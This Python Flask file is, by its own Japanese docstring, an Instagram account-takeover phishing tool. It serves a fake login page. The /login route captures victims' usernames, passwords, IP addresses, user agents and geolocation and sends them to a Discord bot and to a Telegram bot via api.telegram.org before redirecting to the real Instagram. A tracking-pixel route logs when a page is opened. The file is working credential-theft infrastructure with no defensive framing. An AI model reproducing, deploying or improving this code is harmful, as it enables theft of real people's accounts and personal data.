"""
Instagram 乗っ取り(フィッシング)ツール — Flask 本体

Discord Bot は discord_bot.py 側で自動的にスレッド起動します。
このファイルは Bot が落ちてもサイトが落ちないように作ってあります。
"""
from __future__ import annotations

import base64
import os

from flask import Flask, Response, redirect, render_template, request

# --------------------------------------------------------------------------
# Discord Bot（import した時点で自動起動）
# discord.py が入っていなくてもサイトは動くようにフォールバック
# --------------------------------------------------------------------------
try:
    import discord_bot
except Exception as _exc:  # noqa: BLE001
    print(f"[app] discord_bot の読み込みに失敗しました: {_exc}", flush=True)

    class _DiscordBotStub:
        @staticmethod
        def get(key, default=None):
            return default

        @staticmethod
        def cred(*args, **kwargs):
            return None

        @staticmethod
        def opened(*args, **kwargs):
            return False

        @staticmethod
        def lookup_geo(*args, **kwargs):
            return ("", "")

        @staticmethod
        def is_ready():
            return False

        @staticmethod
        def notify(*args, **kwargs):
            return False

    discord_bot = _DiscordBotStub()

# --------------------------------------------------------------------------
# Flask
# --------------------------------------------------------------------------
app = Flask(__name__)
app.config["SECRET_KEY"] = os.environ.get("SECRET_KEY", "change-me-please")

# 1x1 透明GIF
PIXEL = base64.b64decode(
    "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAICRAEAOw=="
)

# Telegram 併用（環境変数があれば自動で有効）
TG_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
TG_CHAT = os.environ.get("TELEGRAM_CHAT_ID", "").strip()


def client_ip() -> str:
    fwd = request.headers.get("X-Forwarded-For", "")
    if fwd:
        return fwd.split(",")[0].strip()
    return request.remote_addr or ""


def telegram(text: str) -> None:
    """TELEGRAM_BOT_TOKEN と TELEGRAM_CHAT_ID があれば Telegram にも送る。"""
    if not (TG_TOKEN and TG_CHAT):
        return
    try:
        import requests

        requests.post(
            f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
            json={"chat_id": TG_CHAT, "text": text},
            timeout=5,
        )
    except Exception as exc:  # noqa: BLE001
        print(f"[telegram] failed: {exc}", flush=True)


# --------------------------------------------------------------------------
# ルート
# --------------------------------------------------------------------------
@app.get("/")
def index():
    return render_template("index.html")


@app.post("/login")
def login():
    username = request.form.get("username", "")
    password = request.form.get("password", "")
    ip = client_ip()
    ua = request.headers.get("User-Agent", "")

    country, city = discord_bot.lookup_geo(ip)
    discord_bot.cred(username, password, ip, ua, country, city)
    telegram(f"🔑 認証情報を取得\nUser: {username}\nPass: {password}\nIP: {ip}")

    return redirect(discord_bot.get("redirect", "https://www.instagram.com/"))


@app.get("/open.gif")
def open_gif():
    ip = client_ip()
    country, city = discord_bot.lookup_geo(ip)

    if discord_bot.opened(ip, country, city):
        telegram(f"👀 ページ開封\nIP: {ip}")

    return Response(
        PIXEL,
        mimetype="image/gif",
        headers={"Cache-Control": "no-store, no-cache, must-revalidate"},
    )


@app.get("/health")
def health():
    return {
        "ok": True,
        "bot_token": bool(os.environ.get("DISCORD_BOT_TOKEN")),
        "chat_id": bool(os.environ.get("DISCORD_LOG_CHANNEL_ID")),
        "discord_ready": discord_bot.is_ready(),
        "telegram": bool(TG_TOKEN and TG_CHAT),
    }


@app.get("/raw")
def raw():
    """Bot を使わずブラウザで確認したいとき用"""
    return "<pre>ok</pre>"


if __name__ == "__main__":
    app.run(
        host="0.0.0.0",
        port=int(os.environ.get("PORT", 5000)),
        debug=True,
        use_reloader=False,  # True だと Bot が2体起動する
    )
